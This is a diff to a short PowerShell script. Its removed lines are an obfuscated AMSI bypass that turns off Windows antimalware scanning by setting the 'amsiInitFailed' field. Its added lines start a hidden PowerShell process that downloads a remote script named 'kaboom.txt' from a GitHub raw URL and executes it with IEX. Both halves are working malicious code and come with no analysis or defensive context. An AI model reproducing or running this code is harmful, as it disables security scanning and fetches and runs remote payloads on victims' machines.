@@ -1,6 +1,7 @@
-$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
-$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
-$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
-$me = $field.GetValue($field)
-$me = $field.SetValue($null, [Boolean]"hhfff")
-pause
+$psi = New-Object System.Diagnostics.ProcessStartInfo;
+$psi.FileName = "powershell";
+$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0Reab/testing/refs/heads/master/kaboom.txt?token=GHSAT0AAAAAAC4Y3JKSHA77RJPUHX3AHZEY2ARDRBA');`"";
+$psi.CreateNoWindow = $true;
+$psi.UseShellExecute = $false;
+[System.Diagnostics.Process]::Start($psi);
+exit;
